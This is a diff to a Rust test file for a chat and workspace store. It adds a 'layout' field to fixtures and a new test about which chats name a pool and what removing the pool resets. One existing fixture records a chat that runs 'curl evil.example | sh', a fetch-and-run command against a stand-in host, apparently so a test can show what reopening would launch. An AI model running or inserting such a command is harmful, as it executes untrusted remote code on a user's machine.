@@ -988,6 +988,7 @@ fn one_read_answers_what_the_plane_contributes_and_what_it_would_start() {
             dealt: 0,
             relaunch_after_update: false,
             clone_seat: None,
+            layout: None,
             focus: None,
             chats: vec![crate::reopen::Chat {
                 program: "/bin/echo".to_owned(),
@@ -1050,6 +1051,7 @@ fn what_opens_a_plane_includes_the_programs_its_reopen_record_would_start() {
             dealt: 0,
             relaunch_after_update: false,
             clone_seat: None,
+            layout: None,
             focus: None,
             chats: vec![
                 a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
@@ -2905,6 +2907,39 @@ fn removing_a_pool_forgets_its_chats_and_what_was_owed_from_it() {
         vec![9]
     );
     assert!(store.recents[0].branches_to_fetch.is_empty());
+}
+
+#[test]
+fn what_names_a_pool_is_what_removing_it_sets_back_to_this_machine() {
+    let plane = Path::new("/planes/a");
+    let mut store = remembering(&["/planes/a"]);
+    assert!(store.recents[0].naming_pool("team").is_empty());
+    store.set_project_chats_run_on(plane, Some("team")).unwrap();
+    store.set_chats_run_on(plane, "web", Some("team")).unwrap();
+    store.set_chats_run_on(plane, "api", Some("team")).unwrap();
+    store
+        .set_chats_run_on(plane, "docs", Some("other"))
+        .unwrap();
+    store.set_chats_run_here(plane, "ops").unwrap();
+    let naming = store.recents[0].naming_pool("team");
+    assert_eq!(
+        naming,
+        NamingPool {
+            project: true,
+            workspaces: vec!["api".to_owned(), "web".to_owned()],
+        }
+    );
+    assert!(!naming.is_empty());
+    // Exactly what removing it changes: afterwards nothing names it.
+    store.recents[0].forget_pool("team");
+    assert!(store.recents[0].naming_pool("team").is_empty());
+    assert_eq!(
+        store.recents[0].naming_pool("other"),
+        NamingPool {
+            project: false,
+            workspaces: vec!["docs".to_owned()],
+        }
+    );
 }
 
 #[test]
